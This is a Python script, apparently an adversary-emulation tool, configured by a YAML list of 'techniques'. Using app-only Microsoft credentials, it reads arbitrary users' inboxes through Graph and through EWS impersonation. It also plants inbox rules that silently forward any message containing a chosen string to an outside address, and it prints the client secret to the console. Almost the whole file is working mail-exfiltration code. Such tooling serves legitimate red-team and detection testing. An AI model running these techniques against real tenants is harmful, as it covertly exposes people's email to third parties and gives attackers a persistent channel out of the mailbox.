import yaml
import requests
from xml.etree import ElementTree as ET


### Other

def load_config(file_path):
    """Load and return the configuration from a YAML file."""
    try:
        with open(file_path, 'r') as file:
            config = yaml.safe_load(file)
            return config
    except FileNotFoundError:
        print(f"Configuration file not found at: {file_path}")
        exit(1)
    except yaml.YAMLError as e:
        print(f"Error parsing the YAML file: {e}")
        exit(1)

### Graph

def get_ms_token(tenant_id, client_id, client_secret, scope):

    token_url = f'https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token'

    token_data = {
        'grant_type': 'client_credentials',
        'client_id': client_id,
        'client_secret': client_secret,
        'scope': scope
    }

    token_r = requests.post(token_url, data=token_data)
    return token_r.json().get('access_token')



def read_email_with_graph(params, token):

    user_email = params['user']
    graph_endpoint = f'https://graph.microsoft.com/v1.0/users/{user_email}/mailFolders/Inbox/messages'

    headers = {
        'Authorization': f'Bearer {token}',
        'Content-Type': 'application/json'
    }
    
    response = requests.get(graph_endpoint, headers=headers)

    if response.status_code == 200:
        print ("OK!")
        messages = response.json().get('value', [])
        for message in messages:
            print(message.get('subject'), message.get('from'))
            body_content = message.get('body', {}).get('content', '')
            #print("Body:", body_content)

def create_rule_with_graph(params, token):

    #https://learn.microsoft.com/en-us/graph/api/resources/messageruleactions?view=graph-rest-1.0
    user_email = params['user']
    rule_name = params['rule_name']
    forward_to = params ['forward_to']
    body_contains = params ['body_contains']


    graph_endpoint = f'https://graph.microsoft.com/v1.0/users/{user_email}/mailFolders/Inbox/messageRules'

    headers = {
        'Authorization': f'Bearer {token}',
        'Content-Type': 'application/json'
    }

    data = {
        "displayName": rule_name,
        "sequence": 1,
        "isEnabled": True,
        "conditions": {
            "bodyContains": [
            body_contains 
            ]
        },
        "actions": {
            "forwardTo": [
            {
                "emailAddress": {
                    "address": forward_to 
                }
            }
            ],
            "stopProcessingRules": True
        }
    }

    response = requests.post(graph_endpoint, headers=headers, json=data)

    if response.status_code == 201:
        print ('Created!')
    else:
        print(f'Error: {response.status_code}')
        print (response.text)    

### EWS
            
 # Function to create SOAP request for FindItem
def create_find_item_soap_request(mailbox):
    return f"""
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                   xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
                   xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
        <soap:Header>
            <t:RequestServerVersion Version="Exchange2013"/>
            <t:ExchangeImpersonation>
                <t:ConnectingSID>
                    <t:PrimarySmtpAddress>{mailbox}</t:PrimarySmtpAddress>
                </t:ConnectingSID>
            </t:ExchangeImpersonation>
        </soap:Header>
        <soap:Body>
            <FindItem xmlns="http://schemas.microsoft.com/exchange/services/2006/messages"
                      xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
                      Traversal="Shallow">
                <ItemShape>
                    <t:BaseShape>IdOnly</t:BaseShape>
                </ItemShape>
                <ParentFolderIds>
                    <t:DistinguishedFolderId Id="inbox"/>
                </ParentFolderIds>
            </FindItem>
        </soap:Body>
    </soap:Envelope>
    """

# Function to create SOAP request for getting emails
def create_get_item_soap_request(item_id, mailbox):

    return f"""
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                   xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
                   xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
        <soap:Header>
            <t:RequestServerVersion Version="Exchange2013"/>
            <t:ExchangeImpersonation>
                <t:ConnectingSID>
                    <t:PrimarySmtpAddress>{mailbox}</t:PrimarySmtpAddress>
                </t:ConnectingSID>
            </t:ExchangeImpersonation>
        </soap:Header>
        <soap:Body>
            <GetItem xmlns="http://schemas.microsoft.com/exchange/services/2006/messages"
                     xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
                <ItemShape>
                    <t:BaseShape>Default</t:BaseShape>
                    <t:BodyType>Text</t:BodyType>
                </ItemShape>
                <ItemIds>
                    <t:ItemId Id="{item_id}"/>
                </ItemIds>
            </GetItem>
        </soap:Body>
    </soap:Envelope>
    """                       

def read_email_with_ews(params, token):
    print ("Starting reading emails with ews")
    # EWS URL
    ews_url = "https://outlook.office365.com/EWS/Exchange.asmx"

    user_email = params['user']

    # Headers
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "text/xml; charset=utf-8"
    }

    # Step 1: FindItem request to get email IDs
    find_item_request = create_find_item_soap_request(user_email)
    find_item_response = requests.post(ews_url, headers=headers, data=find_item_request)
    print(find_item_response)
    find_item_root = ET.fromstring(find_item_response.content)

    # Extract ItemIds from FindItem response (update based on actual XML structure)
    item_ids = []
    for elem in find_item_root.findall('.//{http://schemas.microsoft.com/exchange/services/2006/types}ItemId'):
        item_ids.append(elem.attrib['Id'])

    # Step 2: GetItem requests to read emails
    for item_id in item_ids:
        get_item_request = create_get_item_soap_request(item_id, user_email)
        get_item_response = requests.post(ews_url, headers=headers, data=get_item_request)
        get_item_root = ET.fromstring(get_item_response.content)

        # Extract email details from GetItem response (update based on actual XML structure)
        for message in get_item_root.findall('.//{http://schemas.microsoft.com/exchange/services/2006/types}Message'):
            subject = message.find('{http://schemas.microsoft.com/exchange/services/2006/types}Subject').text
            body = message.find('{http://schemas.microsoft.com/exchange/services/2006/types}Body').text
            print(f"Subject: {subject}\nBody: {body}\n")


def create_forwarding_rule_xml(user, forward_to, rule_name, body_contains):
    """
    Generates SOAP XML for creating a forwarding rule in EWS.

    :param forward_to: The email address to forward emails to.
    :param rule_name: The name of the forwarding rule.
    :param body_contains: A string that must be contained in the email body to trigger the rule.
    :return: A string containing the SOAP XML.
    """
    return f'''<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
                xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
                xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Header>
            <t:RequestServerVersion Version="Exchange2016" />
            <t:ExchangeImpersonation>
            <t:ConnectingSID>
                    <t:PrimarySmtpAddress>{user}</t:PrimarySmtpAddress>
            </t:ConnectingSID>
            </t:ExchangeImpersonation>
        </soap:Header>
        <soap:Body>
            <m:UpdateInboxRules>
                <m:Operations>
                    <t:CreateRuleOperation>
                        <t:Rule>
                            <t:DisplayName>{rule_name}</t:DisplayName>
                            <t:Priority>1</t:Priority>
                            <t:IsEnabled>true</t:IsEnabled>
                            <t:Conditions>
                                <t:ContainsBodyStrings>
                                    <t:String>{body_contains}</t:String>
                                </t:ContainsBodyStrings>
                            </t:Conditions>
                            <t:Exceptions />
                            <t:Actions>
                                <t:ForwardToRecipients>
                                    <t:Address>
                                    <t:EmailAddress>{forward_to}</t:EmailAddress>
                                    </t:Address>
                                </t:ForwardToRecipients>
                            </t:Actions>
                        </t:Rule>
                    </t:CreateRuleOperation>
                </m:Operations>
            </m:UpdateInboxRules>
        </soap:Body>
    </soap:Envelope>'''


def create_rule_with_ews(params, token):

    print ("Starting create rule with ews")
    # EWS URL
    ews_url = "https://outlook.office365.com/EWS/Exchange.asmx"

    user = params['user']
    forward_to =  params['forward_to']
    rule_name =  params['rule_name']
    body_contains =  params['body_contains']

    soap_request = create_forwarding_rule_xml(user, forward_to, rule_name, body_contains)


    # Headers
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "text/xml; charset=utf-8"
    }

    # Send the EWS request with OAuth token
    response = requests.post(ews_url, data=soap_request, headers={
        'Content-Type': 'text/xml; charset=utf-8',
        'Authorization': f'Bearer {token}'
    })

    # Process the response
    if response.status_code == 200:
        print("Rule created successfully.")
        print(response.text)

    else:
        print(f"Failed to create rule. Status code: {response.status_code}")
        print(response.text)

def main():
    config_path = 'config.yml'
    config = load_config(config_path)

    # Accessing specific configuration parameters
    client_id = config['application_id']
    tenant_id = config['tenant_id']
    client_secret = config['client_secret']

    # Print these values to verify they are loaded
    print(f"Application ID: {client_id}")
    print(f"Tenant ID: {tenant_id}")
    print(f"Client Secret: {client_secret}")

    ews_scope   = "https://outlook.office365.com/.default"
    graph_scope = "https://graph.microsoft.com/.default"


    # Proceeding with technique application as before
    for technique in config['techniques']:
        if technique['enabled'] == True and technique['technique'] == 'read_email_with_graph':
            token = get_ms_token(tenant_id, client_id, client_secret, graph_scope)
            read_email_with_graph(technique['parameters'], token)
        elif technique['enabled'] == True and technique['technique'] == 'read_email_with_ews':
            token = get_ms_token(tenant_id, client_id, client_secret, ews_scope )
            read_email_with_ews(technique['parameters'], token)
        elif technique['enabled'] == True and technique['technique'] == 'create_rule_with_graph':
            token = get_ms_token(tenant_id, client_id, client_secret, graph_scope )
            create_rule_with_graph(technique['parameters'], token)
        elif technique['enabled'] == True and technique['technique'] == 'create_rule_with_ews':
            token = get_ms_token(tenant_id, client_id, client_secret, ews_scope )
            create_rule_with_ews(technique['parameters'], token)            
            
if __name__ == "__main__":
    main()
        